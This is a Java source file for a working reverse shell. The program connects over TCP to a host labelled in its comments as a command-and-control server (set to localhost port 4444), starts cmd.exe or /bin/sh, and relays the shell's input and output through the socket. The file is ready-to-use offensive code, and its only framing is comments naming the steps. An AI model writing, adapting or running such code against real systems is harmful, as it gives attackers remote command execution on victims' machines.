import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Shell {

    public static void main(String[] args) {
        // C2 Host configuration
        String host = "127.0.0.1";
        int port = 4444;

        // Defining shell type depend on system
        String shell = System.getProperty("os.name").toLowerCase().contains("win") ? "cmd.exe" : "/bin/sh";

        try {
            // 1. Open TCP socket to server
            Socket socket = new Socket(host, port);

            // 2. Configuring shell
            Process process = new ProcessBuilder(shell).redirectErrorStream(true).start();

            // 3. Get Input or Output from stream
            InputStream processIn = process.getInputStream();
            OutputStream processOut = process.getOutputStream();
            InputStream socketIn = socket.getInputStream();
            OutputStream socketOut = socket.getOutputStream();

            Thread currentThread = Thread.currentThread();
            new Thread(() -> {
                try {
                    byte[] buffer = new byte[1024];
                    int length;
                    while ((length = socketIn.read(buffer)) != -1) {
                        processOut.write(buffer, 0, length);
                        processOut.flush();
                    }
                } catch (Exception e) {}
            }).start();

            byte[] buffer = new byte[1024];
            int length;
            while ((length = processIn.read(buffer)) != -1) {
                socketOut.write(buffer, 0, length);
                socketOut.flush();
            }

            // Gracefull shutdown after connection to server close
            process.destroy();
            socket.close();
        } catch (Exception e) {
            System.err.println("Failed connecting to C2 Server: " + e.getMessage());
        }
    }
}
